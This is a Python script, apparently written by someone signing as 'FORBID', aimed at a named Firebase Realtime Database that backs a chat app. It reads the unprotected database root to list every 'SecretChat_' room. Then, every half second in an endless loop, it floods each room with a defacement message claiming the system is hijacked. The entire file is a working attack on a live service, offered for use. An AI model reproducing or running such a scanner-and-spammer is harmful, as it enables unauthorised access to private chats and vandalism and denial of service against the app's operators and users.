import time
import requests

# Base Firebase database URL
database_url = "https://itmeans-chat-4df62-default-rtdb.asia-southeast1.firebasedatabase.app"

payload = {
    "Sender": "CHAT HACKED BY FORBID",
    "Message": "SYSTEM HIJACKED BY FORBID, DISCORD: forbiddenway",
    "Timestamp": 0,
    "Aura": "voidWings",
    "Color": "red"
}

headers = {
    "Content-Type": "application/json"
}

print("[FORBID] Nuclear Global Scanner & Spammer Initialized...")

session = requests.Session()

while True:
    try:
        # Step 1: Fetch all root keys in the database to find active SecretChat rooms
        root_response = session.get(f"{database_url}/.json", timeout=5)
        
        if root_response.status_code == 200:
            data = root_response.json()
            if isinstance(data, dict):
                # Look for any key starting with "SecretChat_"
                for key in data.keys():
                    if key.startswith("SecretChat_"):
                        room_url = f"{database_url}/{key}.json"
                        payload["Timestamp"] = int(time.time() * 1000)
                        
                        # Step 2: Flood every active room found
                        session.post(room_url, json=payload, headers=headers, timeout=3)
                        print(f"[FORBID] Nuke packet delivered to room: {key}")
        else:
            print(f"[FORBID] Failed to scan database root: {root_response.status_code}")
            
    except Exception as e:
        print(f"[FORBID] Error during global scan/spam: {e}")
        
    # Brief pause before scanning and hitting everyone again
    time.sleep(0.5)
